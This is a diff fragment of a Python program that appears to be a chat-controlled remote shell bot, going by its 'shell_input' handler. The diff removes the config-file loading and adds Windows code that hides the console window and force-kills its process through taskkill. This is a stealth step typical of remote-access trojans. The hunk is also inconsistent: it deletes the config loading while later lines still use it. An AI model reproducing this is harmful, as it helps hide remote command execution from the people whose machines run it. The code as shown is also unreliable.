@@ -204,9 +204,17 @@ async def shell_input(channel, message):
         return
 
 
-# Open 'config.yaml'
-with open("config.yaml") as file:
-    settings = yaml.load(file, Loader=yaml.FullLoader)
+if platform.system() == "Windows":
+    import ctypes
+    import pywintypes
+    import win32process
+
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd != 0:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+        ctypes.windll.kernel32.CloseHandle(hwnd)
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        os.system(f"taskkill /PID {pid} /f")
 
 # Server ID
 server_id = config.server_id
